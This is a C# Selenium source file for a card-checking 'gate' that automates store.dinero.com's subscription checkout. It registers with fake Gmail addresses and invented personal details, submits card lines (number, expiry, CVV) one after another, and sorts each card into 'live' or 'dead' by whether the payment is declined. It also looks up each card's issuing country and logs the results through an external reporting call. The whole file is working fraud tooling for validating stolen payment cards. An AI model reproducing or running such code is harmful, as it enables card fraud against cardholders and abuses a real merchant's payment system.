using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Poseidon
    {

        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();
        string[] ccs;

        public string checkbin(string bin)
        {

            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }
        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 5;
            string nuevacadena = "1630";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {
            var lines = Form1.listCC.Lines.Count();
            if (lines > 0)
            {
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito", "--headless");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://store.dinero.com/";
                Thread.Sleep(1000);
                correo = "joseffernana" + getNum() + "@gmail.com";

                Thread.Sleep(2000);
                driver.ExecuteJavaScript("goPayData(2, 1273, 0, false,'btn-Monthly','dinero','1135142672214573685')");


                Thread.Sleep(2000);

                if (tiempoElemento(By.Id("iframeLogin")))
                {
                    driver.SwitchTo().Frame("iframeLogin");
                    driver.FindElement(By.XPath("/html/body/div[1]/div/div/div[2]/div/div[1]/div/form/div[1]/div/div[1]/input")).SendKeys("DAVID CANO");
                    driver.FindElement(By.XPath("//*[@id='frm-register']/div[1]/div/div[2]/input")).SendKeys(correo);
                    driver.FindElement(By.XPath("//*[@id='frm-register']/div[1]/div/div[3]/input")).SendKeys(clave);
                    Thread.Sleep(500);
                    driver.FindElement(By.XPath("//*[@id='frm-register']/div[6]/div/button")).Click();

                    Thread.Sleep(1000);
                }

                Thread.Sleep(1000);
                driver.SwitchTo().ParentFrame();
                Thread.Sleep(1000);

                if (tiempoElemento(By.Id("Documento")))
                {
                    driver.FindElement(By.Id("Documento")).SendKeys("4652349785");
                    driver.FindElement(By.Id("correo")).SendKeys(correo);
                    driver.FindElement(By.Id("telefono")).SendKeys("3676458745");
                    driver.FindElement(By.Id("Nombre")).SendKeys("DAVID CANO");
                    Thread.Sleep(800);
                    pago();
                }
                else
                {
                    restart();
                }
            }
        }

        public void crearCuenta()
        {

            try
            {
                correo = "joseffernana" + getNum() + "@gmail.com";
                driver.FindElement(By.XPath("//*[@id='bill_address_email']")).SendKeys(correo);
                driver.FindElement(By.XPath("//*[@id='bill_address_first_name']")).SendKeys("JOSE");
                driver.FindElement(By.XPath("//*[@id='bill_address_last_name']")).SendKeys("FERNANDEZ");
            }
            catch (NoSuchElementException) { }
            catch (StaleElementReferenceException) { }
            catch (WebDriverException) { }
            catch (NullReferenceException) { }

            if (tiempoElemento(By.XPath("//*[@id='cc_number']")))
            {
                pago();
            }
            else
            {
                restart();
            }
        }

        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            driver.Close();
            driver.Quit();
            pagos = 0;
            System.Threading.Thread.Sleep(3000);
            load();
        }

        private void pago()
        {
            try
            {
                var lines = Form1.listCC.Lines.Count();


                if (lines > 0)
                {
                    if (pagos < 1)
                    {
                        string cc = Form1.listCC.Lines[0];
                        string[] ccLine = cc.Split('|');
                        //MessageBox.Show(ccLine[0]);
                        driver.FindElement(By.Id("tarjeta")).SendKeys(ccLine[0]);
                        var mes = new SelectElement(driver.FindElement(By.Name("CCMonthExpirationDate")));
                        mes.SelectByValue(int.Parse(ccLine[1]).ToString());
                        var anio = new SelectElement(driver.FindElement(By.Name("CCYearExpirationDate")));
                        anio.SelectByValue(ccLine[2]);
                        driver.FindElement(By.Id("ccv")).SendKeys(ccLine[3]);
                        driver.FindElement(By.Id("titular")).SendKeys("DAVID CANO");
                        Thread.Sleep(800);
                        driver.FindElement(By.Id("terminosCondiciones")).Click();
                        Thread.Sleep(800);
                        driver.FindElement(By.Id("btnPayment")).Click();


                        if (confirmar())
                        {
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6))+" "+Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Form1.textBox1.AppendText("live " + numeroTargeta + " - " + cc );
                            Console.WriteLine("live " + numeroTargeta + " - " + cc );
                            Form1.textBox1.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;

                        }
                        else
                        {
                            Thread.Sleep(300);
                            var guardar = numeroTargeta + " - " + cc + " - " + checkbin(cc.Substring(0, 6))+" "+Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Form1.textBox2.AppendText("dead " + numeroTargeta + " - " + cc );
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc );
                            Form1.textBox2.AppendText(Environment.NewLine);
                            Form1.listCC.Text = Form1.listCC.Text.Remove(0, cc.Length).Trim();
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
            }
            catch (Exception ex)
            {
               // MessageBox.Show(ex.ToString());
                restart();

            }

        }

         public void stop()
        {
            pagos = 0;
            numeroTargeta = 0;
            driver.Close();
            driver.Quit();
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 30)
                {
                    if (IsElementPresent(By.XPath("//*[@id='resultado']/div[2]/div/div/div[3]/div/table/tbody/tr[1]/td[2]")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='resultado']/div[2]/div/div/div[3]/div/table/tbody/tr[1]/td[2]")).Text.Trim() == "DECLINED")
                        {
                            estado = "dead";
                        }
                        else
                        {
                            estado = "live";
                        }

                    }
                    //else
                    //{
                    //    //live
                    //    if (IsElementPresent(By.XPath("//*[@id='receiptThankyou']")))
                    //    {
                    //        estado = zeus.FindElement(By.XPath("//*[@id='receiptThankyou']")).Text;
                    //    }

                    //}
                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }

            if (estado == "dead")
            {
                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}
